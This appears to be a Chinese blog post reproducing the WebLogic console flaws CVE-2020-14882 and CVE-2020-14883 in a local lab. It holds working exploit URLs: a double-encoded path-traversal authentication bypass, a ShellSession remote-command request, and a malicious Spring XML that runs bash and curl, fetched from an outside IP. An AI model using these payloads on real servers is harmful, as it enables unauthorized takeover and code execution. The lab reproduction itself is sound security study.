# weblogic 未授权命令执行漏洞（CVE-2020-14882,CVE-2020-14883）复现 - My_Dreams - 博客园

> 原文：[https://www.cnblogs.com/zzjdbk/p/13971210.html](https://www.cnblogs.com/zzjdbk/p/13971210.html)

# 漏洞描述

2020年10月29日，360CERT监测发现 Weblogic ConSole HTTP 协议代码执行漏洞,该漏洞编号为 CVE-2020-14882,CVE-2020-14883 ，漏洞等级：严重，漏洞评分：9.8。
远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console，并在 WebLogic Server Console 执行任意代码。

# 影响版本

Oracle Weblogic Server 10.3.6.0.0
Oracle Weblogic Server 12.1.3.0.0
Oracle Weblogic Server 12.2.1.3.0
Oracle Weblogic Server 12.2.1.4.0
Oracle Weblogic Server 14.1.1.0.0

# 环境搭建

这里我们测试WebLogic12.2.1.4，java环境是jdk1.8.0_221，自行下载

这里提供WebLogic12.2.1.4的安装教程

下载地址：https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html

下载正确的文件

![](../Images/fdec420b8cdf9dc0a9fd895740fdf4ec.png)

解压

![](../Images/e3a3d1aeef63e570aeab4436c6956c8b.png)

用管理员权限运行

```
java -jar fmw_12.2.1.4.0_wls_lite_generic.jar
```

![](../Images/8d0b186c3a4ef76c5b6c0138dda3af49.png)

 进入安装界面

![](../Images/7a712973089a1b63bc6ed3851a708a02.png)

下一步

![](../Images/8d8142f2bb94e7d064088e27dc64a0e7.png)

![](../Images/a9400f315ed32592c2c0e6c3818eafd8.png)

![](../Images/d7beee78d3371de941352ca36e3cf7f8.png)

 ![](../Images/5de58938e90785a9c638b874410fe931.png)

![](../Images/625a71091f62e267c48517ac321b15ea.png)

下一步

完成

开始安装weblogic的web管理

设置口令，然后创建

![](../Images/2d59071f802b68fb20315deb299e1d6a.png)

启动域

![](../Images/b275b8fade5a225eeb1980675aa9a046.png)

会自动打开weblogic的启动界面

![](../Images/37ab02eeb1b8232c183ecb0581d1215c.png)

我们就进入了weblogic的登录界面（漏洞就是在这个界面触发的）

![](../Images/39ba46f3577d70a130978901b5aa1153.png)

# 漏洞复现

Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。

**CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台**

远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。
权限绕过漏洞（CVE-2020-14882），访问以下URL，未授权访问到管理后台页面（低权限的用户）：

```
http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal
```

![](../Images/332aee5b7a10999d4fc7b6f989a5b654.png)

发现我们现在是低权限的用户，无法安装应用,所以组合下面的CVE-2020-14883 可以继续利用

**CVE-2020-14883：允许后台任意用户通过HTTP协议执行任意命令**

远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console ，并在 WebLogic Server Console 执行任意代码。

这个漏洞的利用方式有两种，一是通过com.tangosol.coherence.mvel2.sh.ShellSession，二是通过com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext。

方法一：

```
http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27curl%20pyxgs4.dnslog.cn%27);%22)
```

成功执行：

![](../Images/e96bdf1523ac922e2c1de110d3bef27f.png)

方法二：

一种更为通杀的方法，对于所有Weblogic版本均有效。

但是必须可以出网，要可以访问到恶意的xml

首先需要构造一个XML文件，并将其保存外网（漏洞机或者可访问的一台机子上）上，就是要有外网ip

```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[curl 6zu4z2.dnslog.cn]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：

```
http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%22http://64.254.68.38:8085/weblogic/evil.xml%22)
```

成功回显

参考文章：

https://blog.csdn.net/god_zzz/article/details/109445728

https://www.cnblogs.com/2rsh0u/p/13911794.html